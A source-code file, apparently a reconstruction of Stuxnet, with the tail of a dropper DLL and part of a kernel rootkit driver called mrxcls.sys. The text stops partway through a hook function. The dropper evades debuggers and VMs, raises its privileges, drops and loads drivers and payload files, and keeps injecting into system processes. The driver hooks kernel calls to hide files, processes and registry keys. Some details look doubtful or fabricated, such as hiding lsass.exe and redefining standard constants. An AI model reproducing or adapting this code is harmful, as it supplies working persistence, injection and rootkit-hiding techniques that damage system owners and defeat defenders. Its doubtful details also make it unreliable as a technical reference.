    g_Wtr4132Ctx.dwTid = GetCurrentThreadId();
    g_Wtr4132Ctx.dwTickStart = GetTickCount();
    InitializeCriticalSection(&g_Wtr4132Ctx.csLock);
    WTR4132_GetPaths();
    WTR4132_InitNtImports();
    WTR4132_GetSystemVersion(&dwMajor, &dwMinor, &dwBuild);
    g_Wtr4132Ctx.hStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!g_Wtr4132Ctx.hStopEvent) {
        DeleteCriticalSection(&g_Wtr4132Ctx.csLock);
        return FALSE;
    }
    g_bInitialized = TRUE;
    return TRUE;
}

static VOID WTR4132_Cleanup(VOID) {
    if (g_Wtr4132Ctx.hMutex) {
        CloseHandle(g_Wtr4132Ctx.hMutex);
        g_Wtr4132Ctx.hMutex = NULL;
    }
    if (g_Wtr4132Ctx.hStopEvent) {
        CloseHandle(g_Wtr4132Ctx.hStopEvent);
        g_Wtr4132Ctx.hStopEvent = NULL;
    }
    if (g_Wtr4132Ctx.hThread) {
        CloseHandle(g_Wtr4132Ctx.hThread);
        g_Wtr4132Ctx.hThread = NULL;
    }
    if (g_pResourceData) {
        HeapFree(GetProcessHeap(), 0, g_pResourceData);
        g_pResourceData = NULL;
    }
    DeleteCriticalSection(&g_Wtr4132Ctx.csLock);
    g_bInitialized = FALSE;
}

static DWORD WINAPI WTR4132_WorkerThread(LPVOID lpParam) {
    while (WaitForSingleObject(g_Wtr4132Ctx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        if (WTR4132_IsExpired()) {
            break;
        }
        WTR4132_InjectExplorer();
        g_dwInfectionCount++;
    }
    return 0;
}

static BOOL WTR4132_StartWorker(VOID) {
    g_Wtr4132Ctx.hThread = CreateThread(NULL, 0, WTR4132_WorkerThread, NULL, 0, NULL);
    return (g_Wtr4132Ctx.hThread != NULL);
}

static BOOL WTR4132_Execute(VOID) {
    HANDLE hMutex;
    if (!WTR4132_Init()) return FALSE;
    if (WTR4132_IsExpired()) {
        WTR4132_Cleanup();
        return FALSE;
    }
    hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        WTR4132_Cleanup();
        return FALSE;
    }
    if (WTR4132_CheckDebugger()) {
        CloseHandle(hMutex);
        WTR4132_Cleanup();
        return FALSE;
    }
    if (WTR4132_CheckVMware()) {
        CloseHandle(hMutex);
        WTR4132_Cleanup();
        return FALSE;
    }
    WTR4132_EnablePrivilege(SE_DEBUG_NAME);
    WTR4132_EnablePrivilege(SE_TCB_NAME);
    WTR4132_EnablePrivilege(SE_LOAD_DRIVER_NAME);
    WTR4132_WriteRegistry();
    WTR4132_ReadRegistry();
    WTR4132_LoadResources();
    WTR4132_DropDriver(STUXNET_DRIVER1, WTR4132_RESOURCE_DRIVER1);
    WTR4132_DropDriver(STUXNET_DRIVER2, WTR4132_RESOURCE_DRIVER2);
    WTR4132_DropPNF(L"oem7A.PNF", WTR4132_RESOURCE_PNF1);
    WTR4132_DropPNF(L"oem6C.PNF", WTR4132_RESOURCE_PNF2);
    WTR4132_DropPNF(L"mdmcpq3.PNF", WTR4132_RESOURCE_PNF3);
    WTR4132_DropPNF(L"mdmeric3.PNF", WTR4132_RESOURCE_PNF4);
    WTR4132_LoadDriver(STUXNET_DRIVER1);
    WTR4132_LoadDriver(STUXNET_DRIVER2);
    WTR4132_LoadMainDLL();
    WTR4132_StartWorker();
    while (WaitForSingleObject(g_Wtr4132Ctx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        if (WTR4132_IsExpired()) {
            break;
        }
        WTR4132_InjectServices();
    }
    WTR4132_Cleanup();
    CloseHandle(hMutex);
    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            break;
        case DLL_PROCESS_DETACH:
            WTR4132_Cleanup();
            break;
        default:
            break;
    }
    return TRUE;
}

DWORD WINAPI Export1(VOID) {
    return WTR4132_Execute() ? 0 : 1;
}

DWORD WINAPI Export2(VOID) {
    return WTR4132_Init() ? 0 : 1;
}

DWORD WINAPI Export3(VOID) {
    return WTR4132_CheckMutex() ? 0 : 1;
}

DWORD WINAPI Export4(VOID) {
    return WTR4132_CheckDebugger() ? 0 : 1;
}

DWORD WINAPI Export5(VOID) {
    return WTR4132_CheckVMware() ? 0 : 1;
}

DWORD WINAPI Export6(VOID) {
    return WTR4132_IsExpired() ? 0 : 1;
}

DWORD WINAPI Export7(VOID) {
    return WTR4132_WriteRegistry() ? 0 : 1;
}

DWORD WINAPI Export8(VOID) {
    return WTR4132_ReadRegistry() ? 0 : 1;
}

DWORD WINAPI Export9(VOID) {
    return WTR4132_LoadResources() ? 0 : 1;
}

DWORD WINAPI Export10(VOID) {
    return WTR4132_LoadMainDLL() ? 0 : 1;
}

DWORD WINAPI Export11(VOID) {
    return WTR4132_InjectExplorer() ? 0 : 1;
}

DWORD WINAPI Export12(VOID) {
    return WTR4132_InjectServices() ? 0 : 1;
}

DWORD WINAPI Export13(VOID) {
    return WTR4132_StartWorker() ? 0 : 1;
}

DWORD WINAPI Export14(VOID) {
    WTR4132_Cleanup();
    return 0;
}

DWORD WINAPI Export15(VOID) {
    return WTR4132_Execute() ? 0 : 1;
}

DWORD WINAPI Export16(VOID) {
    BOOL bResult = TRUE;
    bResult = bResult && WTR4132_DropDriver(STUXNET_DRIVER1, WTR4132_RESOURCE_DRIVER1);
    bResult = bResult && WTR4132_DropDriver(STUXNET_DRIVER2, WTR4132_RESOURCE_DRIVER2);
    bResult = bResult && WTR4132_DropPNF(L"oem7A.PNF", WTR4132_RESOURCE_PNF1);
    bResult = bResult && WTR4132_DropPNF(L"oem6C.PNF", WTR4132_RESOURCE_PNF2);
    bResult = bResult && WTR4132_DropPNF(L"mdmcpq3.PNF", WTR4132_RESOURCE_PNF3);
    bResult = bResult && WTR4132_DropPNF(L"mdmeric3.PNF", WTR4132_RESOURCE_PNF4);
    return bResult ? 0 : 1;
}

DWORD WINAPI Export17(VOID) {
    return WTR4132_LoadDriver(STUXNET_DRIVER1) && WTR4132_LoadDriver(STUXNET_DRIVER2) ? 0 : 1;
}

DWORD WINAPI Export18(VOID) {
    return WTR4132_LoadMainDLL() ? 0 : 1;
}

DWORD WINAPI Export19(VOID) {
    return WTR4132_InjectExplorer() ? 0 : 1;
}

DWORD WINAPI Export20(VOID) {
    return WTR4132_InjectServices() ? 0 : 1;
}

DWORD WINAPI Export21(VOID) {
    return (DWORD)g_Wtr4132Ctx.dwPid;
}

DWORD WINAPI Export22(VOID) {
    return WTR4132_VERSION;
}
END

mrxcls.sys:
#define _WIN32_WINNT 0x0501
#define WINVER 0x0501

#include <ntddk.h>
#include <ntifs.h>
#include <ntimage.h>
#include <ntstatus.h>
#include <ntdddisk.h>

#pragma comment(lib, "ntoskrnl.lib")
#pragma comment(lib, "hal.lib")

#define STATUS_SUCCESS              ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL         ((NTSTATUS)0xC0000001L)
#define STATUS_ACCESS_DENIED        ((NTSTATUS)0xC0000022L)
#define STATUS_INVALID_PARAMETER    ((NTSTATUS)0xC000000DL)
#define STATUS_NO_MORE_ENTRIES      ((NTSTATUS)0x8000001AL)
#define STATUS_OBJECT_NAME_NOT_FOUND ((NTSTATUS)0xC0000034L)
#define STATUS_INSUFFICIENT_RESOURCES ((NTSTATUS)0xC000009AL)
#define STATUS_BUFFER_TOO_SMALL     ((NTSTATUS)0xC0000023L)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#define STATUS_NOT_SUPPORTED        ((NTSTATUS)0xC00000BBL)

#define OBJ_CASE_INSENSITIVE        0x00000040L
#define OBJ_KERNEL_HANDLE           0x00000200L
#define FILE_SHARE_READ             0x00000001
#define FILE_SHARE_WRITE            0x00000002
#define FILE_OPEN_IF                0x00000003
#define FILE_DIRECTORY_FILE         0x00000001
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
#define KernelMode                  0
#define UserMode                    1
#define MAX_PATH                    260

#define STUXNET_MAGIC               0x53545558
#define STUXNET_VERSION             0x00010400
#define MRXCLS_DEVICE_NAME          L"\\Device\\MRxCls"
#define MRXCLS_SYMLINK_NAME         L"\\DosDevices\\MRxCls"
#define MRXCLS_DRIVER_NAME          L"MRxCls"
#define MRXCLS_REGISTRY_PATH        L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\MRxCls"
#define MRXNET_REGISTRY_PATH        L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\MRxNet"
#define MRXCLS_DATA_KEY             L"Data"

#define MRXCLS_IOCTL_INSTALL_HOOKS  0x220000
#define MRXCLS_IOCTL_UNINSTALL_HOOKS 0x220001
#define MRXCLS_IOCTL_LOAD_MRXNET    0x220002
#define MRXCLS_IOCTL_HIDE_PROCESS   0x220003
#define MRXCLS_IOCTL_UNHIDE_PROCESS 0x220004
#define MRXCLS_IOCTL_GET_STATUS     0x220005

#define MRXCLS_HIDE_FLAG_FILE       0x00000001
#define MRXCLS_HIDE_FLAG_PROCESS    0x00000002
#define MRXCLS_HIDE_FLAG_REGISTRY   0x00000004

#define MRXCLS_MAX_HIDDEN_FILES     32
#define MRXCLS_MAX_HIDDEN_PROCESSES 64
#define MRXCLS_MAX_HIDDEN_KEYS      32

#define MRXCLS_POOL_TAG             'slCx'

#define MRXCLS_DRIVER_SIZE          19840

#define MRXCLS_INJECTION_BUFFER_SIZE 0x1000
#define MRXCLS_MAX_INJECTION_ENTRIES 256

#define MRXCLS_ASLR_PREFIX          L"KERNEL32.DLL.ASLR."
#define MRXCLS_ASLR_PREFIX2         L"SHELL32.DLL.ASLR."

#define MRXCLS_HIDDEN_FILE_LIST \
    L"mrxcls.sys", \
    L"mrxnet.sys", \
    L"oem7A.PNF", \
    L"oem6C.PNF", \
    L"mdmcpq3.PNF", \
    L"mdmeric3.PNF", \
    L"~WTR4132.TMP", \
    L"~WTR4141.TMP", \
    L"Copy of Shortcut to.lnk", \
    L"autorun.inf", \
    L"stuxnet.cfg", \
    L"winsta.exe", \
    L"sysnullevnt.mof", \
    L"agentsb.dll", \
    L"datacprs.dll", \
    L"complnd.dll"

#define MRXCLS_HIDDEN_PROCESS_LIST \
    L"lsass.exe", \
    L"services.exe", \
    L"svchost.exe", \
    L"explorer.exe", \
    L"winlogon.exe", \
    L"csrss.exe"

typedef NTSTATUS (NTAPI *PFN_NtQueryDirectoryFile)(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan
);

typedef NTSTATUS (NTAPI *PFN_NtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef NTSTATUS (NTAPI *PFN_NtEnumerateKey)(
    HANDLE KeyHandle,
    ULONG Index,
    KEY_INFORMATION_CLASS KeyInformationClass,
    PVOID KeyInformation,
    ULONG Length,
    PULONG ResultLength
);

typedef NTSTATUS (NTAPI *PFN_NtQueryValueKey)(
    HANDLE KeyHandle,
    PUNICODE_STRING ValueName,
    KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    PVOID KeyValueInformation,
    ULONG Length,
    PULONG ResultLength
);

typedef NTSTATUS (NTAPI *PFN_NtOpenProcess)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId
);

typedef NTSTATUS (NTAPI *PFN_NtCreateFile)(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    PLARGE_INTEGER AllocationSize,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer,
    ULONG EaLength
);

typedef NTSTATUS (NTAPI *PFN_SeValidateImageHeader)(
    PVOID ImageBase,
    ULONG ImageSize,
    BOOLEAN KernelMode
);

typedef NTSTATUS (NTAPI *PFN_ZwProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T NumberOfBytesToProtect,
    ULONG NewAccessProtection,
    PULONG OldAccessProtection
);

typedef NTSTATUS (NTAPI *PFN_ZwAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (NTAPI *PFN_ZwFreeVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG FreeType
);

typedef NTSTATUS (NTAPI *PFN_ZwWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS (NTAPI *PFN_ZwReadVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToRead,
    PSIZE_T NumberOfBytesRead
);

typedef NTSTATUS (NTAPI *PFN_ZwQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

typedef NTSTATUS (NTAPI *PFN_ZwCreateThread)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID ClientId,
    PCONTEXT ThreadContext,
    PINITIAL_TEB InitialTeb,
    BOOLEAN CreateSuspended
);

typedef NTSTATUS (NTAPI *PFN_ZwCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

typedef NTSTATUS (NTAPI *PFN_ZwResumeThread)(
    HANDLE ThreadHandle,
    PULONG SuspendCount
);

typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER WorkingSetPrivateSize;
    ULONG HardFaultCount;
    ULONG NumberOfThreadsHighWatermark;
    ULONGLONG CycleTime;
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    LONG BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
    ULONG HandleCount;
    ULONG SessionId;
    ULONG_PTR UniqueProcessKey;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG PageFaultCount;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    SIZE_T QuotaPeakPagedPoolUsage;
    SIZE_T QuotaPagedPoolUsage;
    SIZE_T QuotaPeakNonPagedPoolUsage;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER ReadOperationCount;
    LARGE_INTEGER WriteOperationCount;
    LARGE_INTEGER OtherOperationCount;
    LARGE_INTEGER ReadTransferCount;
    LARGE_INTEGER WriteTransferCount;
    LARGE_INTEGER OtherTransferCount;
} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;

typedef struct _SERVICE_TABLE_ENTRY {
    PVOID ServiceTableBase;
    PVOID ServiceCounterTableBase;
    ULONG NumberOfServices;
    PVOID ParamTableBase;
} SERVICE_TABLE_ENTRY, * PSERVICE_TABLE_ENTRY;

typedef struct _SERVICE_DESCRIPTOR_TABLE {
    SERVICE_TABLE_ENTRY ntoskrnl;
    SERVICE_TABLE_ENTRY win32k;
    SERVICE_TABLE_ENTRY psx;
    SERVICE_TABLE_ENTRY psxsrv;
} SERVICE_DESCRIPTOR_TABLE, * PSERVICE_DESCRIPTOR_TABLE;

typedef struct _INJECTION_ENTRY {
    HANDLE ProcessId;
    PVOID BaseAddress;
    SIZE_T RegionSize;
    ULONG Protect;
    BOOLEAN Active;
    BYTE bReserved[16];
} INJECTION_ENTRY, * PINJECTION_ENTRY;

typedef struct _MRXCLS_DEVICE_EXTENSION {
    PDEVICE_OBJECT pDeviceObject;
    PDEVICE_OBJECT pLowerDevice;
    PDEVICE_OBJECT pRealDevice;
    BOOLEAN bHooksInstalled;
    BOOLEAN bDriver2Loaded;
    BOOLEAN bInitialized;
    ULONG ulHiddenFileCount;
    ULONG ulHiddenProcessCount;
    ULONG ulHiddenKeyCount;
    ULONG ulInjectionCount;
    WCHAR wszHiddenFiles[MRXCLS_MAX_HIDDEN_FILES][MAX_PATH];
    UNICODE_STRING ustrHiddenProcesses[MRXCLS_MAX_HIDDEN_PROCESSES];
    UNICODE_STRING ustrHiddenKeys[MRXCLS_MAX_HIDDEN_KEYS];
    INJECTION_ENTRY InjectionEntries[MRXCLS_MAX_INJECTION_ENTRIES];
    KSPIN_LOCK SpinLock;
    KEVENT LoadEvent;
    KEVENT UnloadEvent;
    PFN_NtQueryDirectoryFile pOriginalNtQueryDirectoryFile;
    PFN_NtQuerySystemInformation pOriginalNtQuerySystemInformation;
    PFN_NtEnumerateKey pOriginalNtEnumerateKey;
    PFN_NtQueryValueKey pOriginalNtQueryValueKey;
    PFN_NtOpenProcess pOriginalNtOpenProcess;
    PFN_NtCreateFile pOriginalNtCreateFile;
    PFN_SeValidateImageHeader pOriginalSeValidateImageHeader;
    PFN_ZwProtectVirtualMemory pZwProtectVirtualMemory;
    PFN_ZwAllocateVirtualMemory pZwAllocateVirtualMemory;
    PFN_ZwFreeVirtualMemory pZwFreeVirtualMemory;
    PFN_ZwWriteVirtualMemory pZwWriteVirtualMemory;
    PFN_ZwReadVirtualMemory pZwReadVirtualMemory;
    PFN_ZwQueryInformationProcess pZwQueryInformationProcess;
    PFN_ZwCreateThreadEx pZwCreateThreadEx;
    PFN_ZwResumeThread pZwResumeThread;
    PSERVICE_DESCRIPTOR_TABLE pServiceDescriptorTable;
    ULONG ulSSDTIndex_NtQueryDirectoryFile;
    ULONG ulSSDTIndex_NtQuerySystemInformation;
    ULONG ulSSDTIndex_NtEnumerateKey;
    ULONG ulSSDTIndex_NtQueryValueKey;
    ULONG ulSSDTIndex_NtOpenProcess;
    ULONG ulSSDTIndex_NtCreateFile;
    ULONG ulProcessInjectionCount;
    ULONG ulFileHideCount;
    ULONG ulRegistryHideCount;
    ULONG ulIoControlCount;
    ULONG ulErrorCount;
    ULONG ulWarningCount;
    ULONG ulInfoCount;
    BYTE bReserved[256];
} MRXCLS_DEVICE_EXTENSION, * PMRXCLS_DEVICE_EXTENSION;

static PMRXCLS_DEVICE_EXTENSION g_pDeviceExtension = NULL;
static PDRIVER_OBJECT g_pDriverObject = NULL;

static UNICODE_STRING g_ustrHiddenFiles[MRXCLS_MAX_HIDDEN_FILES];
static UNICODE_STRING g_ustrHiddenProcesses[MRXCLS_MAX_HIDDEN_PROCESSES];
static UNICODE_STRING g_ustrHiddenKeys[MRXCLS_MAX_HIDDEN_KEYS];

static VOID MRxCls_InitHiddenLists(VOID) {
    UNICODE_STRING ustrTemp;
    ULONG i = 0;
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"mrxcls.sys");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"mrxnet.sys");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"oem7A.PNF");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"oem6C.PNF");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"mdmcpq3.PNF");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"mdmeric3.PNF");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"~WTR4132.TMP");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"~WTR4141.TMP");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"Copy of Shortcut to.lnk");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"autorun.inf");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"stuxnet.cfg");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"winsta.exe");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"sysnullevnt.mof");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"agentsb.dll");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"datacprs.dll");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"complnd.dll");
    i = 0;
    RtlInitUnicodeString(&g_ustrHiddenProcesses[i++], L"lsass.exe");
    RtlInitUnicodeString(&g_ustrHiddenProcesses[i++], L"services.exe");
    RtlInitUnicodeString(&g_ustrHiddenProcesses[i++], L"svchost.exe");
    RtlInitUnicodeString(&g_ustrHiddenProcesses[i++], L"explorer.exe");
    RtlInitUnicodeString(&g_ustrHiddenProcesses[i++], L"winlogon.exe");
    RtlInitUnicodeString(&g_ustrHiddenProcesses[i++], L"csrss.exe");
    i = 0;
    RtlInitUnicodeString(&g_ustrHiddenKeys[i++], L"NTVDM TRACE");
    RtlInitUnicodeString(&g_ustrHiddenKeys[i++], L"Stuxnet");
    RtlInitUnicodeString(&g_ustrHiddenKeys[i++], L"MRxCls");
    RtlInitUnicodeString(&g_ustrHiddenKeys[i++], L"MRxNet");
}

static BOOLEAN MRxCls_IsFileHidden(PUNICODE_STRING pFileName) {
    ULONG i;
    if (!pFileName || !pFileName->Buffer || pFileName->Length == 0) {
        return FALSE;
    }
    for (i = 0; i < MRXCLS_MAX_HIDDEN_FILES; i++) {
        if (RtlCompareUnicodeString(pFileName, &g_ustrHiddenFiles[i], TRUE) == 0) {
            return TRUE;
        }
    }
    return FALSE;
}

static BOOLEAN MRxCls_IsProcessHidden(PUNICODE_STRING pProcessName) {
    ULONG i;
    if (!pProcessName || !pProcessName->Buffer || pProcessName->Length == 0) {
        return FALSE;
    }
    for (i = 0; i < MRXCLS_MAX_HIDDEN_PROCESSES; i++) {
        if (RtlCompareUnicodeString(pProcessName, &g_ustrHiddenProcesses[i], TRUE) == 0) {
            return TRUE;
        }
    }
    return FALSE;
}

static BOOLEAN MRxCls_IsRegistryKeyHidden(PUNICODE_STRING pKeyName) {
    ULONG i;
    if (!pKeyName || !pKeyName->Buffer || pKeyName->Length == 0) {
        return FALSE;
    }
    for (i = 0; i < MRXCLS_MAX_HIDDEN_KEYS; i++) {
        if (RtlCompareUnicodeString(pKeyName, &g_ustrHiddenKeys[i], TRUE) == 0) {
            return TRUE;
        }
    }
    return FALSE;
}

static NTSTATUS MRxCls_FilterDirectoryEntries(
    PVOID pFileInfo,
    ULONG Length,
    FILE_INFORMATION_CLASS InfoClass,
    PULONG pReturnLength
) {
    PFILE_DIRECTORY_INFORMATION pCurrent;
    PFILE_DIRECTORY_INFORMATION pPrev;
    PFILE_DIRECTORY_INFORMATION pNext;
    UNICODE_STRING ustrFileName;
    ULONG ulEntrySize;
    ULONG ulRemaining;
    ULONG ulNewLength;
    BOOLEAN bFound;
    if (!pFileInfo || Length == 0 || !pReturnLength) {
        return STATUS_INVALID_PARAMETER;
    }
    if (InfoClass != FileDirectoryInformation && InfoClass != FileBothDirectoryInformation) {
        return STATUS_SUCCESS;
    }
    pCurrent = (PFILE_DIRECTORY_INFORMATION)pFileInfo;
    pPrev = NULL;
    ulRemaining = *pReturnLength;
    ulNewLength = 0;
    bFound = FALSE;
    while (ulRemaining >= sizeof(FILE_DIRECTORY_INFORMATION)) {
        ulEntrySize = pCurrent->NextEntryOffset ? pCurrent->NextEntryOffset : ulRemaining;
        ustrFileName.Buffer = pCurrent->FileName;
        ustrFileName.Length = (USHORT)pCurrent->FileNameLength;
        ustrFileName.MaximumLength = (USHORT)pCurrent->FileNameLength;
        if (MRxCls_IsFileHidden(&ustrFileName)) {
            bFound = TRUE;
            if (pCurrent->NextEntryOffset != 0) {
                pNext = (PFILE_DIRECTORY_INFORMATION)((PBYTE)pCurrent + pCurrent->NextEntryOffset);
                if (pPrev == NULL) {
                    RtlCopyMemory(pCurrent, pNext, ulRemaining - pCurrent->NextEntryOffset);
                    pCurrent = (PFILE_DIRECTORY_INFORMATION)pFileInfo;
                    ulRemaining -= pCurrent->NextEntryOffset;
                    continue;
                } else {
                    pPrev->NextEntryOffset += pCurrent->NextEntryOffset;
                    pCurrent = pNext;
                    ulRemaining -= ulEntrySize;
                    continue;
                }
            } else {
                if (pPrev != NULL) {
                    pPrev->NextEntryOffset = 0;
                }
                ulRemaining = 0;
                break;
            }
        }
        ulNewLength += ulEntrySize;
        pPrev = pCurrent;
        pCurrent = (PFILE_DIRECTORY_INFORMATION)((PBYTE)pCurrent + ulEntrySize);
        ulRemaining -= ulEntrySize;
    }
    if (bFound) {
        *pReturnLength = ulNewLength;
    }
    return STATUS_SUCCESS;
}

static NTSTATUS MRxCls_FilterProcessList(
    PVOID pSystemInfo,
    ULONG Length,
    PULONG pReturnLength
) {
    PSYSTEM_PROCESS_INFORMATION pProcess;
    PSYSTEM_PROCESS_INFORMATION pPrev;
    PSYSTEM_PROCESS_INFORMATION pNext;
    ULONG ulRemaining;
    if (!pSystemInfo || Length == 0 || !pReturnLength) {
        return STATUS_INVALID_PARAMETER;
    }
    pProcess = (PSYSTEM_PROCESS_INFORMATION)pSystemInfo;
    pPrev = NULL;
    ulRemaining = *pReturnLength;
    while (ulRemaining >= sizeof(SYSTEM_PROCESS_INFORMATION) && pProcess) {
        if (pProcess->ImageName.Buffer && pProcess->ImageName.Length > 0) {
            if (MRxCls_IsProcessHidden(&pProcess->ImageName)) {
                if (pPrev) {
                    pPrev->NextEntryOffset += pProcess->NextEntryOffset;
                } else {
                    if (pProcess->NextEntryOffset == 0) {
                        pPrev = NULL;
                    } else {
                        pNext = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pProcess + pProcess->NextEntryOffset);
                        RtlCopyMemory(pProcess, pNext, ulRemaining - pProcess->NextEntryOffset);
                        pProcess = (PSYSTEM_PROCESS_INFORMATION)pSystemInfo;
                        continue;
                    }
                }
            }
        }
        pPrev = pProcess;
        if (pProcess->NextEntryOffset == 0) break;
        pProcess = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pProcess + pProcess->NextEntryOffset);
    }
    return STATUS_SUCCESS;
}

static NTSTATUS MRxCls_FilterRegistryKey(
    PVOID pKeyInfo,
    ULONG Length,
    KEY_INFORMATION_CLASS InfoClass,
    PULONG pReturnLength
) {
    PKEY_NAME_INFORMATION pNameInfo;
    UNICODE_STRING ustrKey;
    if (!pKeyInfo || Length == 0 || !pReturnLength) {
        return STATUS_INVALID_PARAMETER;
    }
    if (InfoClass != KeyNameInformation) {
        return STATUS_SUCCESS;
    }
    pNameInfo = (PKEY_NAME_INFORMATION)pKeyInfo;
    ustrKey.Buffer = pNameInfo->Name;
    ustrKey.Length = (USHORT)pNameInfo->NameLength;
    ustrKey.MaximumLength = (USHORT)pNameInfo->NameLength;
    if (MRxCls_IsRegistryKeyHidden(&ustrKey)) {
        return STATUS_NO_MORE_ENTRIES;
    }
    return STATUS_SUCCESS;
}

static NTSTATUS NTAPI MRxCls_Hook_NtQueryDirectoryFile(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan
) {
    NTSTATUS status;
    if (!g_pDeviceExtension || !g_pDeviceExtension->pOriginalNtQueryDirectoryFile) {
        return STATUS_UNSUCCESSFUL;
    }
    status = g_pDeviceExtension->pOriginalNtQueryDirectoryFile(
        FileHandle,
        Event,
        ApcRoutine,
        ApcContext,
        IoStatusBlock,
        FileInformation,
        Length,
        FileInformationClass,
        ReturnSingleEntry,
        FileName,
        RestartScan
    );
    if (!NT_SUCCESS(status) || !FileInformation || !IoStatusBlock) {
        return status;
    }
    MRxCls_FilterDirectoryEntries(
        FileInformation,
        Length,
        FileInformationClass,
        &IoStatusBlock->Information
    );
    return status;
}

static NTSTATUS NTAPI MRxCls_Hook_NtQuerySystemInformation(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
) {
    NTSTATUS status;
    if (!g_pDeviceExtension || !g_pDeviceExtension->pOriginalNtQuerySystemInformation) {
        return STATUS_UNSUCCESSFUL;
    }
    status = g_pDeviceExtension->pOriginalNtQuerySystemInformation(
        SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength
    );
    if (!NT_SUCCESS(status) || SystemInformationClass != 5 || !SystemInformation || !ReturnLength) {
        return status;
    }
    MRxCls_FilterProcessList(SystemInformation, SystemInformationLength, ReturnLength);
    return status;
}

static NTSTATUS NTAPI MRxCls_Hook_NtEnumerateKey(
    HANDLE KeyHandle,
    ULONG Index,
    KEY_INFORMATION_CLASS KeyInformationClass,
